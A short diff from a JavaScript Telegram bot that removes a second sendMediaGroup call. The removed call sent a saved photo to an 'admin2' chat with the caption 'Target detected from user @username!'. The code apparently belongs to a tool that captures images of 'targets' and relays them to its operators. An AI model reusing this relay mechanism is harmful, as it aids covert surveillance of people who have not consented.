@@ -66,15 +66,7 @@ function base64(img, id_t) {
           //media:`http://localhost:3000/${current_name}.png`
         },
       ]);
-      bot.telegram.sendMediaGroup(admin2, [
-        {
-          type: "photo",
-          caption: `<b>🕵️♂️ Цель обнаружена от пользователя @${res.username}! </b>`,
-          parse_mode: "HTML",
-          media: { source: `public/${current_name}.png` },
-          //media:`http://localhost:3000/${current_name}.png`
-        },
-      ]);
+      
       
       
       
